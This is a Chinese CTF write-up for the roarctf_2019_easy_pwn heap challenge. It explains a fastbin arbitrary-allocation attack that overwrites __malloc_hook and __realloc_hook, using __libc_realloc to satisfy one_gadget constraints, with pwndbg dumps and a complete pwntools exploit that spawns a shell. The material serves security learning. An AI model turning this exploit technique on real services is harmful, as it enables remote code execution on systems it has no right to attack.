> 附件：
>
> 链接: [https://pan.baidu.com/s/18KTzZZkdk964ifODugiwow](https://pan.baidu.com/s/18KTzZZkdk964ifODugiwow)  密码: 5ttw
>
> --来自百度网盘超级会员V3的分享
>

上面一个小节末尾说要解决这道题还有一些困难需要我们去解决。

之前我们已经控制了chunk的fd指针，接下来一般的思路就是控制fd指向__malloc_hook，向__malloc_hook写入one_gadget从而getshell。但是这道题不一样，就算你本地可以拿到shell（我本地打不通），但是远程一定是不通的，所以需要使用__libc_realloc来调整栈，脚本先贴上来，慢慢分析：

```python
write(5, 0x60, p64(realloc_hook_addr-0x1b)+'b'*0x58)
create(0x60) #5 = 2
create(0x60) #6 fake_chunk
__libc_realloc_addr=libc_base+libc.symbols['__libc_realloc']
payload=p64(one_gadget_addr)+p64(__libc_realloc_addr+2)
write(6,0x1C,'c'*8+'d'*3+payload)
create(0x10)
```

上一小节已经控制了fd指针指向relloc_hook：

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000: 0x0000000000000000  0x0000000000000021 #index0
0x555555757010: 0x6161616161616161  0x6161616161616161
------------------------------------------------------------------------
0x555555757020: 0x6161616161616161  0x0000000000000071 #index1
0x555555757030: 0x0000000000000000  0x0000000000000000
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090:	0x0000000000000000	0x0000000000000071 #index2:free（index5：malloc)
0x5555557570a0:	0x00007ffff7dd1aed	0x6262626262626262
0x5555557570b0:	0x6262626262626262	0x6262626262626262
0x5555557570c0:	0x6262626262626262	0x6262626262626262
0x5555557570d0:	0x6262626262626262	0x6262626262626262
0x5555557570e0:	0x6262626262626262	0x6262626262626262
0x5555557570f0:	0x6262626262626262	0x6262626262626262
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100: 0x0000000000000000  0x0000000000000071 #index3
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170: 0x0000000000000000  0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0: 0x0000000000000000  0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220: 0x0000000000000000  0x0000000000000000
------------------------------------------------------------------------
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x555555757090 ◂— 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg>
```

开始申请第一个chunk：

```python
create(0x60) #5 = 2
```

```python
pwndbg> x/70gx 0x555555757000
------------------------------------------------------------------------
0x555555757000: 0x0000000000000000  0x0000000000000021 #index0
0x555555757010: 0x6161616161616161  0x6161616161616161
------------------------------------------------------------------------
0x555555757020: 0x6161616161616161  0x0000000000000071 #index1
0x555555757030: 0x0000000000000000  0x0000000000000000
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757090:	0x0000000000000000	0x0000000000000071 #index2:malloc（index5：malloc)
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757100: 0x0000000000000000  0x0000000000000071 #index3
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x555555757170: 0x0000000000000000  0x0000000000000071 #index4
......(省略数据的内容均为空)
------------------------------------------------------------------------
0x5555557571e0: 0x0000000000000000  0x0000000000020e21 #top_chunk
......(省略数据的内容均为空)
0x555555757220: 0x0000000000000000  0x0000000000000000
------------------------------------------------------------------------
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0x7f
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg>
```

现在我们申请到了index2的chunk，和之前一样仍然和index5内存重叠；并且要注意这里使用**Arbitrary Alloc的条件：**

```python
pwndbg> x/16gx 0x7ffff7dd1aed
0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f 
    														#fake_chunk
0x7ffff7dd1afd:	0xfff7a92ea0000000	0xfff7a92a7000007f
0x7ffff7dd1b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b3d <main_arena+29>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b4d <main_arena+45>:	0xfff7dd1aed000000	0x000000000000007f
0x7ffff7dd1b5d <main_arena+61>:	0x0000000000000000	0x0000000000000000
```

再次申请就可以得到0x7ffff7dd1aed这片内存区域了：

```python
create(0x60) #6 fake_chunk
```

```python
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0xfff7a92ea0000000 #由于Arbitrary Alloc导致的fastbin链混乱
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

指的注意到是__realloc_hook和__malloc_hook的地址：

```python
pwndbg> x/16gx 0x7ffff7dd1ae0
0x7ffff7dd1ae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1af0 <_IO_wide_data_0+304>:	0x00007ffff7dd0260	0x0000000000000000
0x7ffff7dd1b00 <__memalign_hook>:	0x00007ffff7a92ea0	0x00007ffff7a92a70
    													#__realloc_hook
        												#指向realloc_hook_ini
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
    							#__malloc_hook
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0xfff7a92ea0000000	0x0000000000000000
pwndbg> 
```

开始写入one_gadget和__libc_realloc：

```python
__libc_realloc_addr=libc_base+libc.symbols['__libc_realloc']
payload=p64(one_gadget_addr)+p64(__libc_realloc_addr+2)
write(6,0x1C,'c'*8+'d'*3+payload)
```

写入之后效果如下：

```python
pwndbg> x/16gx 0x7ffff7dd1ae0
0x7ffff7dd1ae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1af0 <_IO_wide_data_0+304>:	0x00007ffff7dd0260	0x6363630000000000
0x7ffff7dd1b00 <__memalign_hook>:	0x6464646363636363	0x00007ffff7a5227a
    													#__realloc_hook
        												#指向one_gadget
0x7ffff7dd1b10 <__malloc_hook>:	0x00007ffff7a91712	0x000000000000000a
    							#__malloc_hook指向如下图所示
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0xfff7a92ea0000000	0x0000000000000000
pwndbg>
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610935526104-89fe3497-d51f-40c1-90ca-430b72b2ade1.png)

稍微理解一下：

先把 one_gadget 写到 __realloc_hook 中，然后把 __GI___libc_realloc+2 写到 malloc_hook 中，当去 calloc时由于__malloc_hook当中存放有内容，因此会先去执行 __malloc_hook中的__GI___libc_realloc+2；当执行__GI___libc_realloc+2中的“call rax”会去执行 __realloc_hook 里的 one_gadget 从而拿到 shell。

---

来探索一下流程，为方便说明，我们倒着来推：已知下面的one_gadget可以getshell：

```python
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
```

这样调试：

```python
payload=p64(one_gadget_addr)+p64(__libc_realloc_addr+2)
write(6,0x1C,'c'*8+'d'*3+payload)
gdb.attach(p,'b calloc') #对calloc进行下断点
create(0x10)
```

开始调试：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610937118470-efb5393e-34e6-48b0-8e6c-c70061da6067.png)

程序并没有断在calloc，而是断在了read函数的领空，多次输入finish之后以断在calloc领空：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610937235817-24cc61e9-324a-445b-8268-057975ce94f8.png)

开始单步走，多次之后可以得到如下结果：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610937297819-045f96b6-fd55-4c53-b41b-014f3631ec95.png)

遇到call rax，单步步入：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610937404859-72a4a85f-2255-4546-b8df-15564427cc0b.png)

和之前的内存核对一下就可以知道这是在gdb中的__GI___libc_realloc+2，说明程序开始执行__malloc_hook中的内容，继续单步，遇到call rax，单步步入：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610937596265-c48b7562-6b0b-4daa-a51c-4990c35fc175.png)

可以看到程序会执行 __realloc_hook 里的 one_gadget：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610937626753-775d8394-3977-4307-9d4f-ba87e95432d9.png)

从如下内存中可以看出$rsp+0x30==NULL

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610937764677-9e28f084-fd42-4a1a-97d5-174c7f8e9462.png)

one_gadget满足条件，成功执行。

---

总结一下：

Q：为什么要计算出__realloc_hook和__libc_realloc（gdb中是__GI___libc_realloc）？只计算__malloc_hook和one_gadget地址不就行了吗？

A：首先说明，使用one_gadget是有前提条件的，如果不满足前提条件是有可能无法getshell的；在所有的one_gadget无法getshell之后，可以使用__libc_realloc函数开头的push来调整栈帧从而满足one_gadget的条件：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610881310139-2d012b5a-bae8-4d72-b47b-648f2f9d9999.png)

**<font style="color:#F5222D;">注意关于push的多少是要看one_gadget的执行条件的，最好要边调试边看内存。</font>**

**<font style="color:#F5222D;">完整exp如下：</font>**

```python
#coding=utf-8
from pwn import *
context.log_level='debug'

p=process('./roarctf_2019_easy_pwn')
#p=remote('node3.buuoj.cn',28166)
elf=ELF('./roarctf_2019_easy_pwn')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('./libc-2.23.so')

def choose(choose):
    p.recvuntil('choice: ')
    p.sendline(str(choose))

def create(size):
    choose(1)
    p.recvuntil('size: ')
    p.sendline(str(size))

def write(index,size,content):
    choose(2)
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('content: ')
    p.sendline(str(content))

def drop(index):
    choose(3)
    p.recvuntil('index: ')
    p.sendline(str(index))

def show(index):
    choose(4)
    p.recvuntil('index: ')
    p.sendline(str(index))
    p.recvuntil('content: ')
    return u64(p.recv(8))

create(0x18) #0  0x18==24
create(0x68) #1
create(0x68) #2
create(0x68) #3
create(0x68) #4

write(0,34,'a'*24+'\xe1') #0
drop(1) #1
create(0x68)

leak_addr=show(2)
print 'leak_addr:'+hex(leak_addr)
main_arena_offset=0x3c4b20
main_arena_start_offset=0x58
libc_base=leak_addr-main_arena_offset-main_arena_start_offset
print 'libc_base:'+hex(libc_base)
one_gadget_offset=[0x45226,0x4527a,0xf0364,0xf1207]
#one_gadget_offset=[0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget_addr=libc_base+one_gadget_offset[1]
print 'one_gadget:'+hex(one_gadget_addr)
malloc_hook_addr=libc_base+libc.symbols['__malloc_hook']
realloc_hook_addr=libc_base+libc.symbols['__realloc_hook']
print 'malloc_hook_addr:'+hex(malloc_hook_addr)
print 'realloc_hook_addr:'+hex(realloc_hook_addr)

create(0x60) #5
drop(2)

write(5, 0x60, p64(realloc_hook_addr-0x1b)+'b'*0x58)

create(0x60) #5 = 2
create(0x60) #6 fake_chunk
__libc_realloc_addr=libc_base+libc.symbols['__libc_realloc']
payload=p64(one_gadget_addr)+p64(__libc_realloc_addr+2)
write(6,0x1C,'c'*8+'d'*3+payload)
#gdb.attach(p,'b calloc')
create(0x10)

p.sendline('ls')
p.sendline('cat flag')
p.interactive()
```



